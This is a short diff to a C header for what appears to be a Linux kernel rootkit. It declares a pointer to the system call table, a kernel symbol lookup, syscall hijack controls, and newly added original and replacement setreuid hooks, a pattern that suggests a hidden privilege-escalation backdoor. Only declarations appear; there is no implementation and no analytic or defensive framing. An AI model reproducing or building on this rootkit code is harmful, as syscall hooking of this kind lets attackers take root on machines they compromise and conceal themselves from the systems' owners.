@@ -2,7 +2,6 @@
 #   define _R0MOD_GLOBAL_H
 
 #   include <linux/module.h>
-#   include <linux/kernel.h>
 #   include <linux/version.h>
 #   include <linux/unistd.h>
 #   include <linux/slab.h>
@@ -45,6 +44,12 @@
 #       define DEBUG_RW(fmt, ...)
 #   endif
 
+extern unsigned long *sct;
+
+#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
+unsigned long get_symbol(char *name);
+#   endif
+
 char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
 void *memstr(const void *haystack, const char *needle, size_t size);
@@ -54,13 +59,8 @@ void hijack_pause(void *target);
 void hijack_resume(void *target);
 void hijack_stop(void *target);
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
-unsigned long get_symbol(char *name);
-#endif
+extern asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 
-extern unsigned long *sct;
-#   if defined(_CONFIG_X86_64_)
-extern unsigned long *ia32_sct;
-#   endif
+asmlinkage int new_setreuid(uid_t ruid, uid_t euid);
 
 #endif
